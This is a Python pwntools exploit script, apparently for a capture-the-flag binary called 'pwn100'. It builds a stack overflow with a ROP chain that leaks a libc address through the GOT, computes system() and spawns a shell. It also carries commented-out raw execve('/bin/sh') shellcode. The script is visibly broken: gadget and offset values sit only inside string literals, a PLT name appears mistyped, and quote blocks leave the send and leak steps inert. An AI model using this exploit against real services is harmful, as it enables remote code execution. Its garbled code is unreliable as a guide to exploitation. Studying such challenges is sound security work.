from pwn import *
import time

#defult setting and find address
target = "./pwn100"
local = not True
HOST = '54.153.19.139'
HOST = '127.0.0.1'
PORT = 5252

'''
pop3ret = 0x0804855d
__libc_start_main_rel = 0x00019a00 # cgPwn - #160-Ubuntu
system_rel = 0x00040310
'''

#check target
if local:
    conn = process(target)
else:
    conn = remote(HOST, PORT)

target_bin = ELF(target)

#Setting Enable Environment
# context
context.update(arch='i386', os='linux')
context.clear(arch=target_bin.arch)
context.log_level = 'debug' 
#log_level must be one of ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.terminal = ['tmux', 'splitw', '-h']

#Attack~~~!!!
#simple BoF... dummy of local area
ROP = "A" * 28
'''
ROP = "A" * 28 +\
     "\x00\xd2\xff\xff" +\
     "\x90" * 500 +\
     "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" +\
     "\x90" * 300

'''
# write(1, __libc_start_main_got, 4)
ROP += p32(target_bin.plt['get'])
ROP += p32(pop3ret)
ROP += p32(1)
ROP += p32(target_bin.got['__libc_start_main'])
ROP += p32(4)

# read(0, __libc_start_main_got, 20)
ROP += p32(target_bin.plt['read'])
ROP += p32(pop3ret)
ROP += p32(0)
ROP += p32(target_bin.got['__libc_start_main'])
ROP += p32(20)

# system('/bin/sh')
ROP += p32(target_bin.plt['__libc_start_main'])
ROP += p32(0xBBBB)
ROP += p32(target_bin.got['__libc_start_main']+4)


#print conn.recv(1024)
'''
conn.sendline(ROP)
time.sleep(0.1)

'''
__libc_start_main_addr = u32(conn.recv(4))
libc_base = __libc_start_main_addr - __libc_start_main_rel
system_addr = libc_base + system_rel

print "libc_base:{}".format(hex(libc_base))
conn.send(p32(system_addr) + "/bin/bash\x00")
time.sleep(0.1)
'''

conn.interactive()
